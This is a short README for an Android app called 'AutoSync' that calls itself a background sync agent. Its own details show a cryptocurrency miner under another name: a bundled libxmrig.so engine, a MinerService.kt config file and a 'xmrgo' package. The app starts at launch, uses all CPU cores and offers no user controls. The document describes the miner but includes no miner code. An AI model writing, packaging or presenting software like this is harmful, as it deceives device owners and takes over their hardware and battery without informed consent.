# AutoSync - Android background sync agent

Single-purpose Android app: opens and instantly starts a bundled background
sync engine (arm64 static build, inside the APK as libxmrig.so) that keeps a
persistent connection active using all CPU threads. No buttons, no dialogs,
no storage permissions.

- Endpoint config: see app/src/main/java/com/stonix/xmrgo/MinerService.kt
- Threads: all cores (Runtime.availableProcessors())

## Build
Open in Android Studio (or ./gradlew assembleRelease after adding the
Gradle wrapper) and build normally.

## Notes
- The engine binary is a static aarch64 build bundled in the APK.
- Runs as a foreground service; a persistent notification is shown while active.
